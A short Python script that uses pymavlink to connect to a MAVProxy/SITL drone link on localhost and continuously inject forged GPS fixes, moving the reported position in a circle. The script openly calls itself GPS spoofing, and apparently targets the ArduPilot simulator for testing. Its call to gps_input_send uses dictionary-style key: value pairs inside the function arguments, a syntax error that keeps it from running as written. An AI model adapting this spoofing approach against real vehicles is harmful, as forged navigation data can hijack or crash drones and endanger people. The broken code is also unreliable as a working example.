from pymavlink import mavutil
import math
import time

# Connection to MAVProxy/SITL
master = mavutil.mavlink_connection('udp:127.0.0.1:14550')

master.wait_heartbeat()

print("MavProxy connesso")

def send_gps(lat, lon, alt):
    master.mav.gps_input_send(
        'time_usec' : 0,   # time_usec
        'gps_id' : 0,        # gps_id
        'ignore_flags' : 0,                        # ignore_flags
        'time_week_ms' : 0,  # time_week_ms
        'time_week' : 0,          # time_week
        'fix_type' : 3,                        # fix_type (3 = 3D fix)
        'lat' : int(lat * 1e7),           # lat in degE7
        'lon' : int(lon * 1e7),           # lon in degE7
        'alt' : float(alt),               # altitude (meters)
        'hdop' : 1.0,                      # hdop
        'vdop' : 1.0,                      # vdop
        'vn' : 0.0,                      # velocity north
        've' : 0.0,                      # velocity east
        'vd' : 0.0,                      # velocity down
        'speed_accuracy' : 0.5,                      # speed_accuracy
        'horiz_accuracy' : 1.0,                      # horiz_accuracy
        'vert_accuracy' : 1.0,                      # vert_accuracy
        'satellites_visible' : 10                        # satellites_visible
    ) 

# Parameters for circular motion
center_lat = -35.363262
center_lon = 149.165237
radius = 0.0001
altitude = 10
angle = 0

print("Starting GPS spoofing...")

while True:
    spoof_lat = center_lat + radius * math.cos(math.radians(angle))
    spoof_lon = center_lon + radius * math.sin(math.radians(angle))

    send_gps(spoof_lat, spoof_lon, altitude)

    angle += 10
    if angle >= 360:
        angle = 0

    time.sleep(1)

